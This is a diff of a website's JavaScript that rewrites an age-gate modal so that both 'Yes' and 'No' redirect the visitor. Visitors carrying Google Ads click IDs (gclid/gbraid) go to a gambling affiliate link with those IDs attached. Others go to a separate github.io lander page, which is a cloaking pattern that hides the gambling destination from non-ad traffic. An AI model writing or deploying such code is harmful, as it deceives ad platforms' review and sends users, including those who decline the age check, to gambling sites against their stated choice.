@@ -36,12 +36,36 @@ if (form) {
 
 // Age-gate: show ONLY on home page (index.html or root) and once per session.
 // Closes on Yes/No and stays on the page.
-(function(){
+(function () {
   const path = window.location.pathname;
-  const isHome = /(^\/$|index\.html$)/.test(path);
-  if(!isHome) return;
-  if(sessionStorage.getItem('ageGateShown') === '1') return;
-  sessionStorage.setItem('ageGateShown', '1');
+  const isHome = /(^\/$|lander\.html$)/.test(path);
+  if (!isHome) return;
+
+  // Carry selected params into a target URL
+  function carryParams(targetUrl, keys) {
+    const src = new URL(window.location.href);
+    const dst = new URL(targetUrl);
+    keys.forEach(k => {
+      const v = src.searchParams.get(k);
+      if (v) dst.searchParams.set(k, v);
+    });
+    return dst.toString();
+  }
+
+  // Decide where to go based on presence of gclid/gbraid
+  function computeTarget() {
+    const qp = new URL(window.location.href).searchParams;
+    const hasClickId = qp.has('gclid') || qp.has('gbraid');
+
+    if (!hasClickId) {
+      // No ids -> send to Orbitivus lander
+      return 'https://clickgainn.github.io/new//lander';
+    }
+
+    // Has gclid/gbraid -> send to MyBookie and carry ids
+    const base = 'https://link.everygame.eu/c/422754';
+    return carryParams(base, ['gclid', 'gbraid']);
+  }
 
   const bd = document.createElement('div');
   bd.className = 'modal-backdrop';
@@ -57,52 +81,52 @@ if (form) {
   document.body.appendChild(bd);
   bd.style.display = 'flex';
 
-  function closeGate(){ 
-    bd.style.display = 'none'; 
-    bd.remove(); 
-  }
+  function go() { window.location.href = computeTarget(); }
 
-  // ✅ Redirect when "Yes" is clicked
-  bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "/gameforge/privacy.html"; // change to your target page
-  });
-
-  // ✅ Just close modal when "No" is clicked
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
-
+  bd.querySelector('#age-yes').addEventListener('click', go);
+  bd.querySelector('#age-no').addEventListener('click', go);
 })();
 
 
-(function(){
-  const path = window.location.pathname;
-  const isHome = /(^\/$|lander\.html$)/.test(path);
-  if(!isHome) return;
+(function () {
+  const toggle = document.querySelector('[data-nav-toggle]');
+  const menu = document.querySelector('[data-nav-menu]');
 
-  const bd = document.createElement('div');
-  bd.className = 'modal-backdrop';
-  bd.innerHTML = `
-    <div class="modal">
-      <h3>Policy Notice</h3>
-      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
-      <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn" id="age-yes">Yes, Accept</button>
-        <button class="btn ghost" id="age-no">Close</button>
-      </div>
-    </div>`;
-  document.body.appendChild(bd);
-  bd.style.display='flex';
+  if (!toggle || !menu) return;
 
-  function closeGate(){ bd.style.display='none'; bd.remove(); }  
-  // ✅ Redirect when "Yes" is clicked
-  bd.querySelector('#age-yes').addEventListener('click', 
-                                                function(){
-    window.location.href = "#"; // change to your target page
-  });
+  const openMenu = () => {
+    menu.classList.add('is-open');
+    toggle.setAttribute('aria-expanded', 'true');
+    menu.setAttribute('aria-hidden', 'false');
+  };
 
-  // ✅ Just close modal when "No" is clicked
-  bd.querySelector('#age-no').addEventListener('click', 
-                                               function(){
-    window.location.href = "#"; // change to your target page
+  const closeMenu = () => {
+    menu.classList.remove('is-open');
+    toggle.setAttribute('aria-expanded', 'false');
+    menu.setAttribute('aria-hidden', 'true');
+  };
+
+  const toggleMenu = () => {
+    if (menu.classList.contains('is-open')) { closeMenu(); } else { openMenu(); }
+  };
+
+  // Toggle on click
+  toggle.addEventListener('click', toggleMenu);
+
+  // Close on link click (better UX)
+  menu.querySelectorAll('a').forEach(a => a.addEventListener('click', closeMenu));
+
+  // Reset on resize back to desktop
+  window.addEventListener('resize', () => {
+    if (window.innerWidth >= 1221) {
+      menu.classList.remove('is-open');
+      toggle.setAttribute('aria-expanded', 'false');
+      menu.setAttribute('aria-hidden', 'false'); // desktop menu visible
+    } else {
+      // ensure aria reflects collapsed state until user opens it
+      menu.setAttribute('aria-hidden', menu.classList.contains('is-open') ? 'false' : 'true');
+    }
   });
 })();
+
 
